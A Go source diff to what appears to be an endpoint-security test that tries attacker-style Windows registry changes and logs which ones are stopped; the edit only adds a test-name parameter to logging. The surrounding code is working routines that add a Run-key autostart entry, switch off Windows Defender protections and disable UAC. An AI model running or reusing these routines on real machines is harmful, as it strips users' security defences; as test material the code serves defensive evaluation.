@@ -8,7 +8,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-func createStartKey(nameOfLogFile string) int {
+func createStartKey(nameOfLogFile string, nameOfTest string) int {
 	keyStart, b, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
 	if !b {
 		if err != nil {
@@ -21,17 +21,17 @@ func createStartKey(nameOfLogFile string) int {
 
 	err = keyStart.SetStringValue("Show Box", getFullPath+"\\showMessage\\showMess.exe")
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	}
 
 	err = keyStart.DeleteValue("Show Box")
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	}
 	return 0
 }
 
-func disableWindowsDefender(nameOfLogFile string) int {
+func disableWindowsDefender(nameOfLogFile, nameOfTest string) int {
 	keyAV, err := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", registry.WRITE)
 	if err != nil {
 		return 1
@@ -52,37 +52,37 @@ func disableWindowsDefender(nameOfLogFile string) int {
 
 	err = keyAV.SetDWordValue(disableAntiSpywareName, disableAntiSpywareValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
 	err = keyAV.SetDWordValue(disableAntiVirusName, disableAntiVirusValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
 	err = keyAV.SetDWordValue(disableRealtimeMonitoringName, disableRealtimeMonitoringValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
 	err = keyAV.SetDWordValue(disableRoutinelyTakingActionName, disableRoutinelyTakingActionValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
 	err = keyAV.SetDWordValue(disableSpecialRunningModesName, disableSpecialRunningModesValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
 	err = keyAV.SetDWordValue(serviceKeepAliveName, serviceKeepAliveValue)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	} else {
 		return 1
 	}
@@ -90,7 +90,7 @@ func disableWindowsDefender(nameOfLogFile string) int {
 	return 0
 }
 
-func disableUAC(nameOfLogFile string) int {
+func disableUAC(nameOfLogFile, nameOfTest string) int {
 	keyUAC, b, err := registry.CreateKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", registry.WRITE)
 	if !b {
 		if err != nil {
@@ -100,7 +100,7 @@ func disableUAC(nameOfLogFile string) int {
 
 	err = keyUAC.SetDWordValue("EnableLUA", uint32(0))
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 		return 1
 	}
 
@@ -109,16 +109,16 @@ func disableUAC(nameOfLogFile string) int {
 
 func main() {
 	numberOfStoppedRegistryModifications := 0
-	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "RegKeys")
-	helpers.WriteLog(nameOfLogFile, "Starting test: RegistryKeys", 2)
-	numberOfStoppedRegistryModifications += createStartKey(nameOfLogFile)
-	numberOfStoppedRegistryModifications += disableWindowsDefender(nameOfLogFile)
-	numberOfStoppedRegistryModifications += disableUAC(nameOfLogFile)
+	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "RegistryKeysTest", "RegistryKeysTest")
+	helpers.WriteLog(nameOfLogFile, "Starting test: RegistryKeys", 2, "RegistryKeysTest")
+	numberOfStoppedRegistryModifications += createStartKey(nameOfLogFile, "RegistryKeysTest")
+	numberOfStoppedRegistryModifications += disableWindowsDefender(nameOfLogFile, "RegistryKeysTest")
+	numberOfStoppedRegistryModifications += disableUAC(nameOfLogFile, "RegistryKeysTest")
 
 	if numberOfStoppedRegistryModifications == 3 {
 		os.Exit(1)
 	} else {
-		helpers.WriteLog(nameOfLogFile, "Ending test: RegistryKeys", 2)
+		helpers.WriteLog(nameOfLogFile, "Ending test: RegistryKeys", 2, "RegistryKeysTest")
 		os.Exit(0)
 	}
 
